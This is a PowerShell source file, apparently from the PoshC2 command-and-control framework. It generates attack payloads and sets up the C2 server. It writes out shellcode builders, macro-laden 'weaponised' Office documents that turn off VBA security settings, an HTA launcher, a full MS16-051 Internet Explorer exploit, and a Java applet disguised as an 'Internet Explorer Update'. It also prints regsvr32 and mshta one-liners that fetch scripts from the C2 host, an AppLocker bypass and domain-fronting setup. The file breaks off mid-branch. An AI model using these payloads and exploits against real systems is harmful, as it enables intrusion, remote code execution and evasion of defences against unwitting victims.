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"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)

    $RawBytes = [System.Convert]::FromBase64String($86)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x86'
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh_x86.dll", $dllBytes)
    Write-Host -Object "x86 DLL Written to: $global:newdir\payloads\posh_x86.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File $global:newdir\payloads\posh_x86.dll
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh-shellcode_x86.bin", $shellcodeBytes)
    Write-Host -Object "x86 Shellcode Written to: $global:newdir\payloads\posh-shellcode_x86.bin"  -ForegroundColor Green

    $RawBytes = [System.Convert]::FromBase64String($64)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x64'
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh_x64.dll", $dllBytes)
    Write-Host -Object "x64 DLL Written to: $global:newdir\payloads\posh_x64.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File $global:newdir\payloads\posh_x64.dll
    [io.file]::WriteAllBytes("$global:newdir\payloads\posh-shellcode_x64.bin", $shellcodeBytes)
    Write-Host -Object "x64 Shellcode Written to: $global:newdir\payloads\posh-shellcode_x64.bin"  -ForegroundColor Green

    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $ExcelApp = New-Object -ComObject "Excel.Application"
    $ExcelVersion = $ExcelApp.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $ExcelApp.DisplayAlerts = $false
    $ExcelApp.DisplayAlerts = "wdAlertsNone"
    $ExcelApp.Visible = $false
    $ExcelWorkbook = $ExcelApp.Workbooks.Add(1)
    $ExcelWorksheet = $ExcelWorkbook.Worksheets.Item(1)
    $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
    $ExcelVBA.CodeModule.AddFromString($macrodoc)
    $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
    $ExcelApp.Workbooks.Close()
    $ExcelApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Word
    $WordApp = New-Object -ComObject "Word.Application"
    $WordVersion = $WordApp.Version
    
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    
    $WordApp.Visible = $false
    $WordPage = $WordApp.Documents.Add()
    $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
    $WordVBA.CodeModule.AddFromString($macrodoc)
    $WordPage.SaveAs([ref]"$global:newdir\payloads\WordMacro", [ref][Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
    $WordApp.Quit()

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null

    Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
    $PPTApp = New-Object -ComObject "Powerpoint.Application"
    $PPTVersion = $PPTApp.Version
    $notvisible = [microsoft.office.core.msotristate]::msoFalse

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
    $BlankLayout = $SlideType::ppLayoutTitleOnly

    $PPTPage = $PPTApp.Presentations.Add([microsoft.office.core.msotristate]::msoFalse)
    $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
    $PPTVBA.CodeModule.AddFromString($macrodoc)
    $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
    $PPTPage.Close()
    $PPTApp.Quit()
    Stop-Process -name "POWERPNT"

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings | Out-Null
    }
    catch{
    
    }
}

# create HTA payload
function CreateHTAPayload
{

    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    
    #HTA index file generation
    # output simple html for loading HTA. This could be used with any cloned web page.
    # host this HTML and Launcher.HTA on a web server.
    # HTA Payload taken from https://github.com/trustedsec/unicorn , minus the obfuscation
    $HTMLCode = '<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>'
    $HTMLFile = "$global:newdir\payloads\index.html"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile

    #HTA Payload file generation
    $HTMLCode = @"
    <script>
    ao=new ActiveXObject("WScript.Shell");
    ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c powershell $payloadraw', 0);window.close();
    </script>
"@
    $HTMLFile = "$global:newdir\payloads\Launcher.hta"
    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
    Write-Host -Object "HTA Payload written to: $global:newdir\index.html and Launcher.hta"  -ForegroundColor Green
}

# create MS16-051 payload
function Create-MS16-051-Payload
{
    $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $htmlpayload = $poshexec+'"'+','+$payload

  $html = @"
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "$htmlpayload"
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
"@

  [IO.File]::WriteAllLines("$global:newdir\payloads\ms16-051.html", $html)
  Write-Host -Object "MS16-051 payload, use this via a web server: $global:newdir\payloads\ms16-051.html"  -ForegroundColor Green
}
# taken from nishang Out-Java
function CreateJavaPayload
{
$OutputPath="$pwd"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$payloadraw = [Convert]::ToBase64String($bytes)

# Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
$JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@

# compile the Java file
$JavaFile = "$OutputPath\JavaPS.java"
Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile

$JavacPath = "$JDKPath" + "\bin\javac.exe"
& "$JavacPath" "$JavaFile"

# create a manifest for JAR, taken from SET
$Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@

$ManifestFile = "$OutputPath\manifest.txt"
Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

# create the JAR
$Jarpath = "$JDKPath" + "\bin\jar.exe"
& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
   
# output simple html. This could be used with any cloned web page.
# host this HTML and SignedJarPS.jar on a web server.
$HTMLCode = @'
<div> 
<object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
</object></div>
<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
'@
$HTMLFile = "$global:newdir\payloads\applet.html"
Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

# cleanup
Remove-Item "$OutputPath\JavaPS*"
  
# cleanup to remove temporary files
Remove-Item "$OutputPath\manifest.txt"
Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and applet.html"  -ForegroundColor Green
}

# if the server has been restarted using the Restart-C2Server shortcut
if ($RestartC2Server) 
{
    $global:newdir = $RestartC2Server
    $payload = Get-Content "$global:newdir\payloads\payload.bat"
    Write-Host -Object "Using existing database and payloads: $global:newdir"
    $Database = "$global:newdir\PowershellC2.SQLite"
    $taskscompleted = Invoke-SqliteQuery -DataSource $Database -Query "SELECT CompletedTaskID FROM CompletedTasks" -As SingleValue

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $ipv4address = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $serverport = $c2serverresults.ServerPort 
    $shortcut = $c2serverresults.QuickCommand
    $downloaduri = $c2serverresults.DownloadURI
    $httpresponse = $c2serverresults.HTTPResponse
    $enablesound = $c2serverresults.Sounds
    $urlstring = $c2serverresults.URLS

    Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
    Write-Host "To quickly get setup for internal pentesting, run:"
    write-host $shortcut `n -ForegroundColor green
    Write-Host "For a more stealthy approach, use SubTee's exploits:"
    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
    write-host ""
    Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
    write-host ""
    Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
    write-host ""


    #launch a new powershell session with the implant handler running
    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"

    foreach ($task in $taskscompleted) {
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
    $ranuri = $resultsdb.RandomURI
    $implanthost = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
    if ($resultsdb)
    {
        if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
        elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
        else 
        {
            Write-Host "Command Issued @" $resultsdb.TaskID "Against Host" $implanthost -ForegroundColor Green
            Write-Host -Object $resultsdb.Command -ForegroundColor Red
            Write-Host -Object $resultsdb.Output
        }
        $taskiddb ++
    }
    }
    $newcount = $taskscompleted.Count
    $taskiddb = $newcount+1
    write-host "$newcount tasks completed before resuming the C2 server"
}
else 
{
    # determine if there are multiple network adaptors
    $localipfull = Get-WmiObject -Query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" |
    Select-Object -ExpandProperty IPAddress | 
    Where-Object -FilterScript {([Net.IPAddress]$_).AddressFamily -eq 'InterNetwork'}
    if ($localipfull)
    {
        Write-Output -InputObject "IP found: $localipfull"
        write-host ""
        $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
        $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
    }
    $uri="http://"
    $prompthttpsdef = "Yes"
    $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS for implant comms? [Yes]"
    $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
    if ($prompthttps -eq "Yes") {
    $uri="https://"
    $ipv4address = "https://"+$ipv4address
    $promptssldefault = "Yes"

    #detect if powershell < v4
    $psver = $PSVersionTable.psversion.Major
    if ($psver -lt '4') {
        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use the default self-signed SSL certificate [Yes]"
        $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
        if ($promptssl -eq "Yes") {
            CERTUTIL -f -p poshc2 -importpfx "$PoshPath\poshc2.pfx"
            $thumb = "DE5ADA225693F8E0ED43453F3EB512CE96991747"
            $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
            $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
            if ($Added = "SSL Certificate successfully added") {
                netsh.exe http show sslcert ipport=0.0.0.0:443
            }
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
    } else {
    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate [Yes]"
    $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
    if ($promptssl -eq "Yes") {
        $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
        $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
        $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
        if ($Added = "SSL Certificate successfully added") {
            netsh.exe http show sslcert ipport=0.0.0.0:443
        } else {
            Write-Error "Error adding the certificate" 
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}
} else {
            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
https://www.microsoft.com/en-us/download/details.aspx?id=17275
selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443

or 
    
Download and convert the PEM to PFX for windows import and import to personal:
openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx

Grab the thumbprint:
dir cert:\localmachine\my|% { `$_.thumbprint}

Install using netsh:
netsh http delete sslcert ipport=0.0.0.0:443
netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
"
}

}

    $promptdomfrontdef = "No"
    $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting? [No]"
    $promptdomfront = ($promptdomfrontdef,$promptdomfront)[[bool]$promptdomfront]
    if ($promptdomfront -eq "Yes") {
        $promptdomfront = Read-Host -Prompt "[2c] Please specify the host header for domain fronting?"
        if ($promptdomfront) {
            $domainfrontheader = $promptdomfront
        }
    }

    $defaultserverport = 443
    } else {
